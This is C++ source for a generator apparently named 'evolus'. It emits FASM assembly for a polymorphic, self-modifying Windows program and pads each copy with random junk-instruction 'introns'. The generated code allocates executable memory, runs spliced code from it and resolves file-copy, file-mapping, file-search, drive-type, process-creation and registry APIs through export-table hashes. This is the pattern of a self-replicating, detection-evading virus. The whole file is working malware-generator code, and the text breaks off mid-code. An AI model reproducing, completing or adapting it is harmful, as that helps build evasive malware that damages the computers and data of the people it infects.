#include <cstdlib>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <list>
#include <math.h>
#include <sstream>
#include <vector>

using namespace std;

ofstream file;

string I2S(double n)
{
  stringstream out;
  out << n;
  string rv = out.str();
  return(rv);
}


void addnumber(string BigNum);
void GetAddress(string address);
void CallAPI(string APIName);
void CalcNewRandNumberAndSaveIt(); 
void nopdC();
void nopsC();
void zer0(int rr);
void subsaved(int rr);


#define IntronInsertThreshold 11
int IntronSTST;
int IntronNOP;
void CreateAnIntron()
{
     if (!(rand()%IntronInsertThreshold))
     {
         if (rand()%6)
         {
             // Here we use START+STOP intron
             
             file << "db StopCodon" << endl;
             while(rand()%31)
             {
                 
                 file << "db " << I2S((rand()%255)^0x67) << endl;
             }             
             file << "db StartCodon" << endl;
             IntronSTST++;
         }
         else
         {
             while(rand()%31)
             {                 
                 //file << "db " << I2S((rand()%255)|0x91) << endl;
                 file << "_nopREAL" << endl;                                               
             }
             IntronNOP++;
         }         
     }
}

void addnumber(string BigNum)
{
        file << "    BigNum=" << BigNum << endl;
        file << "    AlreadyStarted=0" << endl; CreateAnIntron();
        file << "    if BigNum<25" << endl; CreateAnIntron();
        file << "        repeat BigNum" << endl;
        file << "            _add0001" << endl;
        file << "        end repeat" << endl;
        file << "    else" << endl;
        file << "        _pushall" << endl; CreateAnIntron();
        file << "        _push  ; BC1 to stack" << endl;
        file << "        _save" << endl; CreateAnIntron();
        file << "        _xor   ; BC1=0" << endl;
        file << "        _add0001" << endl; CreateAnIntron();
        file << "        _save" << endl;
        file << "        _sub0001 ; BC1=0, BC2=1" << endl; CreateAnIntron();
        file << "        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1" << endl;
        file << "        {" << endl;
        file << "            if AlreadyStarted=1" << endl;
        file << "                _shl" << endl;
        file << "            end if" << endl;
        file << "            if (BigNum AND num)>0" << endl;
        file << "                _add0001" << endl;
        file << "                AlreadyStarted=1" << endl;
        file << "            end if" << endl;
        file << "        }" << endl;
        file << "        _save           ; BC2=BigNum" << endl; CreateAnIntron();
        file << "        _pop            ; restore BC1" << endl;
        file << "        _addsaved       ; BC1=BC1+BigNum" << endl; CreateAnIntron();
        nopdC();
        file << "        _popall         ; Restore all registers" << endl;
        nopsC();
        file << "        _pushall        ; Restore ZF" << endl; CreateAnIntron();
        file << "        _save" << endl;
        file << "        _and" << endl;
        file << "        _popall" << endl;
        file << "    end if" << endl;

}  



void GetAddress(string address)
{
        file << "    _getDO" << endl; CreateAnIntron();
        string tmpstr=address+"-DataOffset"; CreateAnIntron();
        addnumber(tmpstr);
} 


void CallAPI(string APIName)
{
        file << "    _getDO" << endl; CreateAnIntron();
        string tmpstr=APIName+"-DataOffset";
        addnumber(tmpstr); CreateAnIntron();
        file << "    _getdata" << endl;
        file << "    _call" << endl; CreateAnIntron();
}

void CalcNewRandNumberAndSaveIt()
{
        GetAddress("RandomNumber");
        file << "        _saveWrtOff" << endl; CreateAnIntron();
        file << "        _getdata" << endl; CreateAnIntron();
        file << "        _nopdA                   ; eax=[RandomNumber]" << endl; CreateAnIntron();
        zer0(0);
        addnumber("1103515245");        
        file << "        _mul                     ; eax*=1103515245 % 2^32" << endl; CreateAnIntron();
        zer0(0);
        addnumber("12345");     CreateAnIntron();
        file << "        _save" << endl;
        file << "        _nopsA" << endl; CreateAnIntron();
        file << "        _addsaved                ; eax+=12345 % 2^32" << endl;
        file << "        _writeDWord              ; mov [RandomNumber], ebx" << endl; CreateAnIntron();
}

void nopdC()
{
    file << "        _pushall                ; save all registers" << endl; CreateAnIntron();
    file << "        _push                   ; save BC1" << endl; CreateAnIntron();
    file << "        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists." << endl; CreateAnIntron();
    file << "        _saveWrtOff             ; BA1=RegC" << endl; CreateAnIntron();
    file << "        _pop" << endl; CreateAnIntron();
    file << "        _writeDWord             ; mov dword[RegC], BC1" << endl; CreateAnIntron();
    file << "        _popall                 ; restore all registers" << endl; CreateAnIntron();
} 


void nopsC()
{
    file << "        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists." << endl; CreateAnIntron();
    file << "        _getdata" << endl; CreateAnIntron();
}



void zer0(int rr)
{
    if (rr!=0)
    {
        file << "_pushall" << endl; CreateAnIntron();
    }

    file << "_save           ; BC2=BC1" << endl; CreateAnIntron();
    file << "_xor            ; BC1=BC1 XOR BC2 = 0" << endl; CreateAnIntron();

    if (rr!=0)
    {
        nopdC();
        file << "_popall" << endl;
        nopsC(); CreateAnIntron();
    }
}


void subsaved(int rr)
{
    if (rr!=0)
    {
        file << "        _pushall" << endl; CreateAnIntron();
    }
        file << "        _push           ; save BC1" << endl; CreateAnIntron();
        zer0(1);
        file << "        _sub0001        ; BC1=0xFFFFFFFF" << endl; CreateAnIntron();
        file << "        _xor            ; BC1=0xFFFFFFFF XOR BC2" << endl; CreateAnIntron();
        file << "        _add0001        ; BC1=-BC2" << endl; CreateAnIntron();
        file << "        _save           ; BC2=-BC2" << endl; CreateAnIntron();
        file << "        _pop            ; restore BC1" << endl; CreateAnIntron();
        file << "        _addsaved       ; BC1=BC1+(-BC2)" << endl; CreateAnIntron();

    if (rr!=0)
    {
        CreateAnIntron();
        nopdC(); CreateAnIntron();
        file << "        _popall" << endl; CreateAnIntron();
        nopsC(); CreateAnIntron();
        file << "        _pushall        ; Restore ZF" << endl; CreateAnIntron();
        file << "        _save" << endl; CreateAnIntron();
        file << "        _and" << endl; CreateAnIntron();
        file << "        _popall" << endl; CreateAnIntron();        
    }
}



vector<string> RemoveElement(vector<string> *List, string Element)
{
    if (Element!="")
    {
        List->push_back("");
        for (vector<string>::iterator i=List->begin(); i!=List->end(); ++i)
        {
            if ((*i)==Element) { List->erase(i); }
        }
        List->erase(List->end());
    }
    return(*List);
}

#define TranslatorIntron 2
int cIntronN;
void CreateIntronTranslator(bool wFlags=0, string El1="", string El2="", string El3="", string El4="", string El5="", string El6="", string El7="", string El8="")
{
//    cout << wFlags << wEAX << wEBX << wECX << wEDX << wEBP << wESI << wEDI << endl << "- - -" << endl;
    vector<string> AllReg;
    AllReg.push_back("EAX"); AllReg.push_back("EBX"); AllReg.push_back("ECX"); AllReg.push_back("EDX");
    AllReg.push_back("EDI"); AllReg.push_back("ESI"); AllReg.push_back("EBP"); AllReg.push_back("ESP");
    
    vector<string> UnUsedReg;
    UnUsedReg.push_back("EAX"); UnUsedReg.push_back("EBX"); UnUsedReg.push_back("ECX"); UnUsedReg.push_back("EDX");
    UnUsedReg.push_back("EDI"); UnUsedReg.push_back("ESI"); UnUsedReg.push_back("EBP");
    UnUsedReg=RemoveElement(&UnUsedReg,El1);
    UnUsedReg=RemoveElement(&UnUsedReg,El2);
    UnUsedReg=RemoveElement(&UnUsedReg,El3);
    UnUsedReg=RemoveElement(&UnUsedReg,El4);
    UnUsedReg=RemoveElement(&UnUsedReg,El5);
    UnUsedReg=RemoveElement(&UnUsedReg,El6);
    UnUsedReg=RemoveElement(&UnUsedReg,El7);
    UnUsedReg=RemoveElement(&UnUsedReg,El8);                            
        
    vector<string> ArithOp2Arg;
    ArithOp2Arg.push_back("add");
    ArithOp2Arg.push_back("sub");
    ArithOp2Arg.push_back("xor");
    ArithOp2Arg.push_back("and");
    ArithOp2Arg.push_back("or");
    ArithOp2Arg.push_back("cmp");
    ArithOp2Arg.push_back("test"); 
    
    vector<string> ArithOp1Arg;
    ArithOp1Arg.push_back("inc");
    ArithOp1Arg.push_back("dec");

    vector<string> ShiftVec;    
    ShiftVec.push_back("shr");
    ShiftVec.push_back("shl");    
       
    
    if (!(rand()%TranslatorIntron))
    {
        cIntronN++;

        if (wFlags)
        {
            while (rand()%13)
            {
                int rr=rand()%8;
                if (rr<3)  { file << "nop" << endl; }
                if (rr==4) { file << "mov "  << UnUsedReg[rand()%UnUsedReg.size()] << "," << AllReg[rand()%AllReg.size()] << endl; }
                if (rr==5) { file << "mov "  << UnUsedReg[rand()%UnUsedReg.size()] << "," << rand() << endl; }                                
                if (rr==6) { file << "xchg " << UnUsedReg[rand()%UnUsedReg.size()] << "," << UnUsedReg[rand()%UnUsedReg.size()] << endl; }
                if (rr==7) { file << "push " << AllReg[rand()%AllReg.size()] << endl << "pop " << UnUsedReg[rand()%UnUsedReg.size()] << endl; }
                if (rr==8) { file << "push " << rand() << endl << "pop " << UnUsedReg[rand()%UnUsedReg.size()] << endl; }                
            }
        }
        else
        {
            while (rand()%13)
            {
                int rr=rand()%25;                           
                if (rr<3)  { file << "nop" << endl; }
                if (rr==4) { file << "mov "  << UnUsedReg[rand()%(UnUsedReg.size())] << "," << AllReg[rand()%(AllReg.size())] << endl; }
                if (rr==5) { file << "mov "  << UnUsedReg[rand()%(UnUsedReg.size())] << "," << rand() << endl; }                
                if (rr==6) { file << "xchg " << UnUsedReg[rand()%(UnUsedReg.size())] << "," << UnUsedReg[rand()%(UnUsedReg.size())] << endl; }
                if (rr==7) { file << "push " << AllReg[rand()%(AllReg.size())] << endl << "pop " << UnUsedReg[rand()%(UnUsedReg.size())] << endl; }
                if (rr==8) { file << "push " << rand() << endl << "pop " << UnUsedReg[rand()%(UnUsedReg.size())] << endl; }                   
                if (rr>8 && rr<=13)  { file << ArithOp2Arg[rand()%ArithOp2Arg.size()] << " " << UnUsedReg[rand()%UnUsedReg.size()] << "," << AllReg[rand()%AllReg.size()] << endl; }
                if (rr>13 && rr<=16) { file << ArithOp2Arg[rand()%ArithOp2Arg.size()] << " " << UnUsedReg[rand()%UnUsedReg.size()] << "," << rand() << endl; }
                if (rr>16 && rr<=20) { file << ArithOp1Arg[rand()%ArithOp1Arg.size()] << " " << UnUsedReg[rand()%UnUsedReg.size()] << endl; } 
                if (rr>20 && rr<=23) { file << ShiftVec[rand()%ShiftVec.size()] << " " << UnUsedReg[rand()%UnUsedReg.size()] << ", " << rand()%(0x100) << endl; } 
                if (rr>23) { file << ShiftVec[rand()%ShiftVec.size()] << " " << UnUsedReg[rand()%UnUsedReg.size()] << ", cl" <<  endl; }                        
            }
        }
    }
}


void ZeroRegister(string Reg)
{
    int rr=rand()%4;
    if (rr==0)
    {
        file << "mov " << Reg << ",0" << endl;
    }
    if (rr==1)
    {
        file << "xor " << Reg << "," << Reg << endl;
    }
    if (rr==2)
    {
        file << "sub " << Reg << "," << Reg << endl;
    } 
    if (rr==3)
    {
        file << "push 0" << endl << "pop " << Reg << endl;
    }
}


void MovRegNum(string Reg, int Num)
{
    int rr=rand()%5;
    if (rr==0)
    {
        file << "mov "<< Reg << "," << Num << endl; 
    }
    if (rr==1)
    {
        ZeroRegister(Reg);
        file << "add "<< Reg << "," << Num << endl; 
    }
    if (rr==2)
    {
        ZeroRegister(Reg);
        file << "sub "<< Reg << ",-" << Num << endl; 
    }
    if (rr==3)
    {
        ZeroRegister(Reg);
        file << "xor "<< Reg << "," << Num << endl; 
    } 
    if (rr==4)
    {
        ZeroRegister(Reg);
        file << "or "<< Reg << "," << Num << endl; 
    }
}

void Lea(string Reg, string Address, string Num)
{
    int rr=rand()%2;
    if (rr==0)
    {
        file << "mov "<< Reg << "," << Address << endl; 
        file << "add "<< Reg << "," << Num << endl;
    }
    if (rr==1)
    {
        ZeroRegister(Reg);
        file << "lea "<< Reg << ",[" << Address << "+" << Num << "]" << endl; 
    }
}

int main()
{
    // Get the list of process identifiers.
    cout << "\nCreate evolus with introns\n" << endl;
    cout <<   "**************************\n\n" << endl;
IntronSTST=0;
IntronNOP=0;
cIntronN=0;
    srand ( time(NULL) );


    file.open("evolus.asm");

    vector<string> UseReg;
    UseReg.push_back("EAX"); UseReg.push_back("EBX"); UseReg.push_back("EDX");
    
    string SplicSepX=UseReg[rand()%UseReg.size()]; string SplicSepL=SplicSepX.substr(1,1)+"L"; UseReg=RemoveElement(&UseReg,SplicSepX);
//    cout << "SplicSepX: " << SplicSepX << endl;    
    
    UseReg.push_back("ECX"); 
    string CodonContX=UseReg[rand()%UseReg.size()]; string CodonContL=CodonContX.substr(1,1)+"L"; UseReg=RemoveElement(&UseReg,CodonContX);
//    cout << "CodonContX: " << CodonContX << endl;
    
    UseReg.push_back("EBP"); UseReg=RemoveElement(&UseReg,"ECX");
    string CodonCount=UseReg[rand()%UseReg.size()]; UseReg=RemoveElement(&UseReg,CodonCount);   
//    cout << "CodonCount: " << CodonCount << endl;   
    
    UseReg.push_back(CodonContX); UseReg.push_back("ECX"); 
    string TmpReg=UseReg[rand()%UseReg.size()];    
//    cout << "TmpReg: " << TmpReg << endl;       
//    cin.get(); 
    

file << "include " << static_cast<char>(39) << "E:" << static_cast<char>(92) << "Programme" << static_cast<char>(92) << "FASM" << static_cast<char>(92) << "INCLUDE" << static_cast<char>(92) << "win32ax.inc" << static_cast<char>(39) << "" << endl;
file << "" << endl;
file << "RndNum = %t AND 0xFFFF" << static_cast<char>(39) << "FFFF" << endl;
file << "macro GetNewRandomNumber" << endl;
file << "{" << endl;
file << "    RndNum = ((RndNum*214013+2531011) AND 0xFFFF" << static_cast<char>(39) << "FFFF)" << endl;
file << "}" << endl;
file << "" << endl;
file << ".data" << endl;
file << "       include " << static_cast<char>(39) << "data_n_equs.inc" << static_cast<char>(39) << "" << endl;
file << ";        a db " << static_cast<char>(34) << "Am I allowed to live?" << static_cast<char>(34) << ",0x0" << endl;
file << ";        b db " << static_cast<char>(34) << "In evolution we trust" << static_cast<char>(34) << ",0x0" << endl;
file << "" << endl;
file << "" << endl;
file << ".code" << endl;
file << "start:" << endl;
while(rand()%11){ CreateIntronTranslator(); }
file << "" << endl; CreateIntronTranslator();
file << "       AlignedSize=0x1" << static_cast<char>(39) << "0000" << endl;
file << "       while ((EndAmino-StAmino)*8)>AlignedSize" << endl;
file << "           AlignedSize=AlignedSize+0x1" << static_cast<char>(39) << "0000" << endl;
file << "       end while" << endl;
file << "" << endl; CreateIntronTranslator();
file << " push PAGE_EXECUTE_READWRITE" << endl; CreateIntronTranslator();
file << " push 0x1000" << endl;CreateIntronTranslator();
file << " push AlignedSize" << endl; CreateIntronTranslator();
file << " push 0x0" << endl; CreateIntronTranslator();
file << " stdcall [VirtualAlloc]" << endl; CreateIntronTranslator(0, "EAX");
file << "       mov     [Place4Life], eax" << endl; CreateIntronTranslator();
ZeroRegister(SplicSepX); CreateIntronTranslator(0, SplicSepX);
ZeroRegister(CodonCount); CreateIntronTranslator(0, SplicSepX, CodonCount);
file << "       WriteMoreToMemory:" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount);
ZeroRegister(CodonContX); CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << "               mov     " << CodonContL << ", byte[" << CodonCount << "+StAmino]" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << "               cmp     " << CodonContL << ", StartCodon " << endl; CreateIntronTranslator(1, SplicSepX, CodonCount, CodonContX);
file << "               jne     SplicingNoStart" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
ZeroRegister(SplicSepX); CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << "               SplicingNoStart:" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << "               cmp     " << CodonContL << ", StopCodon" << endl; CreateIntronTranslator(1, SplicSepX, CodonCount, CodonContX);
file << "               jne     SplicingNoStop" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
MovRegNum(SplicSepX, 0x91); CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << "               SplicingNoStop:" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << "               or      " << CodonContL << ", " << SplicSepL <<  endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
file << "               shl     " << CodonContX << ", 3" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, CodonContX);
Lea("ESI", "StartAlphabeth", CodonContX);
file << "               mov     " << TmpReg << "," << CodonCount << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, TmpReg, "ESI");
file << "               shl     " << TmpReg << ", 3" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, TmpReg, "ESI");
file << "               mov     edi, [Place4Life]" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, TmpReg, "ESI", "EDI");
file << "               add     edi, " << TmpReg << endl; CreateIntronTranslator(0, SplicSepX, CodonCount, "ESI", "EDI");
MovRegNum("ECX", 8); CreateIntronTranslator(0, SplicSepX, CodonCount, "ESI", "EDI", "ECX");
file << "               rep     movsb" << endl; CreateIntronTranslator(0, SplicSepX, CodonCount);
file << "               inc     " << CodonCount << endl;  CreateIntronTranslator(0, SplicSepX, CodonCount);
file << "       cmp     " << CodonCount << ", (EndAmino-StAmino)" << endl;  CreateIntronTranslator(1, SplicSepX, CodonCount);
file << "       jne     WriteMoreToMemory" << endl; CreateIntronTranslator();
while(rand()%11){ CreateIntronTranslator(); }
file << "       call    [Place4Life]                            ; Lets start!!!" << endl; CreateIntronTranslator();
file << "" << endl;
while(rand()%11){ CreateIntronTranslator(); }
file << "" << endl;
file << "" << endl;
file << "" << endl;
file << "; ##################################################################" << endl;
file << "; Alphabeth" << endl;
file << "StartAlphabeth:" << endl;
file << "include " << static_cast<char>(39) << "alphabeth.inc" << static_cast<char>(39) << "" << endl;
file << "CreateAlphabet" << endl;
file << "" << endl;
file << "EndAlphabeth:" << endl;
file << "" << endl;
file << "; ##################################################################" << endl;
file << "" << endl;
//file << "include " << static_cast<char>(39) << "instruction_set_macros.inc" << static_cast<char>(39) << "" << endl;
file << "" << endl;
file << "; ##################################################################" << endl;
file << "; Amino Acids" << endl;
for (int i=0; i<500; i++) { CreateAnIntron(); }
file << "StAmino:" << endl;
for (int i=0; i<500; i++) { CreateAnIntron(); }
file << "" << endl;
file << "; ############################################################################" << endl;
file << "; ############################################################################" << endl;
file << "; ############################################################################" << endl;
file << "; #####" << endl;
file << "; #####  Here the genom gets the Addresses of the Windows APIs." << endl;
file << "; #####  It loads via LoadLibrary the kernel32.dll and advapi32.dll," << endl;
file << "; #####  searchs in the Export Table for the adequade API (creating" << endl;
file << "; #####  an internal 12 bit checksum, and compares it with some hardcoded" << endl;
file << "; #####  12bit values). This procedere should be evolvable." << endl;
file << "; #####" << endl;
file << "; #####  Optimum would have been to call the Windows APIs by its" << endl;
file << "; #####  Ordinal Numbers, but they change at every release of Windows." << endl;
file << "; #####" << endl;
file << "; #####  At Linux, evolvable API calls are already presented, as you" << endl;
file << "; #####  call int 0x80 with a specific number in eax which represents" << endl;
file << "; #####  the API number." << endl;
file << "; #####" << endl;
file << "; #####" << endl;
file << ";" << endl;
file << "; The Hash-Algo is equivalent to:" << endl;
file << "; ===============================" << endl;
file << ";" << endl;
file << ";;FindAPIGiveMeTheHash:" << endl;
file << ";; In: ebx=pointer to API name" << endl;
file << ";; Out: eax=Hash   (in ax)" << endl;
file << ";; changed: eax" << endl;
file << ";;        mov     ebx, apistr" << endl;
file << ";" << endl;
file << ";        push    ebx" << endl;
file << ";        push    ecx" << endl;
file << ";        push    edx" << endl;
file << ";        xor     eax, eax" << endl;
file << ";        xor     ecx, ecx" << endl;
file << ";        dec     ebx" << endl;
file << ";        FindAPIGiveMeTheHashMore:" << endl;
file << ";                inc     ebx" << endl;
file << ";                mov     ecx, dword[ebx]" << endl;
file << ";                xor     eax, ecx" << endl;
file << ";                mov     edx, ecx        ; ecx=nooo - n ... new byte" << endl;
file << ";                shr     edx, 8          ; edx=000n ... new byte" << endl;
file << ";                cmp     dl, 0           ; dl=n" << endl;
file << ";        jne     FindAPIGiveMeTheHashMore" << endl;
file << ";" << endl;
file << ";        and     eax, 0x0FFF" << endl;
file << ";        pop     edx" << endl;
file << ";        pop     ecx" << endl;
file << ";        pop     ebx" << endl;
file << ";ret" << endl;
file << "" << endl;
file << "" << endl;
file << "" << endl;
file << "StAminoAcids1:" << endl;
file << ";        repeat 100" << endl;
file << ";            _nopREAL" << endl;
file << ";        end repeat" << endl;
file << "" << endl;
file << "" << endl;
file << "       db _START" << endl;
file << "       db _STOP" << endl;
file << "" << endl;
file << "       db _START" << endl;
file << "" << endl;
GetAddress("mCloseHandle");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x0342");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mCopyFileA");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x0C5C");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mCreateFileA");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x0615");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mCreateFileMappingA");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x04E1");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mCreateProcessA");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x0674");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mGetDriveTypeA");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x0AFD");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mGetCommandLineA");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x06A8");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mGetFileSize");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x083B");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mWriteFile");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x078B");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mGetTickCount");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x01B4");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mMapViewOfFile");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x05EE");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mSleep");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x07F9");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mFindFirstFileA");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x094A");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mFindNextFileA");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x0FE1");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mUnmapViewOfFile");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x01D1");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mSetErrorMode");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x0CBB");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mRegCreateKeyA");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x0EDC");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
GetAddress("mRegSetValueExA");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x0845");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
file << "" << endl;
GetAddress("stDLLkernel32");
file << "       _saveWrtOff                      ; to the data-section. This will be used" << endl; CreateAnIntron();
file << "       _nopdA                           ; by LoadLibraryA as argument later" << endl; CreateAnIntron();
zer0(0);
addnumber("\'kern\'");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();
zer0(0);
addnumber("\'el32\'");
file << "       _writeDWord" << endl; CreateAnIntron();
file << "" << endl;
file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();
zer0(0);
addnumber("\'.dll\'");
file << "       _writeDWord" << endl; CreateAnIntron();

GetAddress("stDLLadvapi32");
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();
zer0(0);
addnumber("\'adva\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();
zer0(0);
addnumber("\'pi32\'");
file << "       _writeDWord" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();
zer0(0);
addnumber("\'.dll\'");
file << "       _writeDWord" << endl; CreateAnIntron();


GetAddress("stDLLkernel32");
file << "       _push" << endl; CreateAnIntron();
file << "       _CallAPILoadLibrary      ; invoke LoadLibrary, " << static_cast<char>(34) << "kernel32.dll" << static_cast<char>(34) << "" << endl; CreateAnIntron();

GetAddress("hDLLlibrary32");
file << "       _saveWrtOff" << endl; CreateAnIntron();


file << "       _nopsA" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[hDLLkernel32], eax" << endl; CreateAnIntron();

file << "       _save                    ; Save kernel32.dll position" << endl; CreateAnIntron();
addnumber("0x3C");
file << "       _getdata                 ; mov RegB, dword[hDLLkernel32+0x3C]" << endl; CreateAnIntron();
file << "                                ; = Pointer to PE Header of kernel32.dll" << endl; CreateAnIntron();
file << "       _addsaved                ; relative -> absolut" << endl; CreateAnIntron();

addnumber("0x78");
file << "       _getdata                 ; Export Tables" << endl; CreateAnIntron();
file << "       _addsaved                ; relative -> absolut" << endl; CreateAnIntron();
addnumber("0x1C");

file << "       _nopdA                   ; temporarily save Offset of Addresse Table in RegA" << endl; CreateAnIntron();

GetAddress("hAddressTable");
file << "       _saveWrtOff              ; WriteOffset=hAddressTable" << endl; CreateAnIntron();

file << "       _nopsA                   ; restore RegA=Addresse Tables" << endl; CreateAnIntron();
file << "       _getdata                 ; Pointer To Addresse Table" << endl; CreateAnIntron();
file << "       _addsaved                ; relative -> absolut" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[hAddressTable], (Pointer to Addresse Table)" << endl; CreateAnIntron();

GetAddress("hNamePointerTable");
file << "       _saveWrtOff              ; WriteOffset=hNamePointerTable" << endl; CreateAnIntron();

file << "       _nopsA                   ; BC1=Addresse Table" << endl; CreateAnIntron();
addnumber("4");
file << "       _nopdA" << endl; CreateAnIntron();

file << "       _getdata                 ; Pointer To Name Table" << endl; CreateAnIntron();
file << "       _addsaved                ; relative -> absolut" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[hNamePointerTable], (Pointer to Name Pointer Table)" << endl; CreateAnIntron();

GetAddress("hOrdinalTable");
file << "       _saveWrtOff              ; WriteOffset=hOrdinalTable" << endl; CreateAnIntron();

file << "       _nopsA" << endl; CreateAnIntron();
addnumber("4");

file << "       _getdata                 ; Ordinal Table" << endl; CreateAnIntron();
file << "       _addsaved                ; relative -> absolut" << endl; CreateAnIntron();
file << "       _writeDWord              ; mov dword[hOrdinalTable], (Pointer to Ordinal Table)" << endl; CreateAnIntron();



GetAddress("APINumber");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(1);
addnumber("APINumberKernel");
file << "       _writeDWord              ; Save number of kernel32.dll APIs" << endl; CreateAnIntron();


GetAddress("hAddressePointer");
file << "       _saveWrtOff" << endl; CreateAnIntron();
GetAddress("APIAddresses");
file << "       _writeDWord      ; Saves the AddressePointer" << endl; CreateAnIntron();


GetAddress("hMagicNumberPointer");
file << "       _saveWrtOff" << endl; CreateAnIntron();
GetAddress("APIMagicNumbersKernel");
file << "       _writeDWord      ; Saves the MagicNumber Pointer" << endl; CreateAnIntron();

zer0(0);
addnumber("43");
file << "       _push" << endl; CreateAnIntron();

file << "; FindAllAPIs" << endl; CreateAnIntron();
file << "       _getEIP" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _saveJmpOff      ; mov BA2, eip  - for further API searching in different DLLs" << endl; CreateAnIntron();

file << "       _pushall" << endl; CreateAnIntron();

zer0(0);
file << "               _nopdB          ; RegB = Counter for first instance loop = 0" << endl; CreateAnIntron();

GetAddress("hAddressePointer");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _nopdA           ; RegA = Pointer to Buffer for API Addresse" << endl; CreateAnIntron();

GetAddress("hMagicNumberPointer");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _nopdD           ; RegD = Pointer to Magic Numbers for APIs" << endl; CreateAnIntron();



file << "           ; FindAllAPIsNext" << endl; CreateAnIntron();
file << "               _getEIP" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
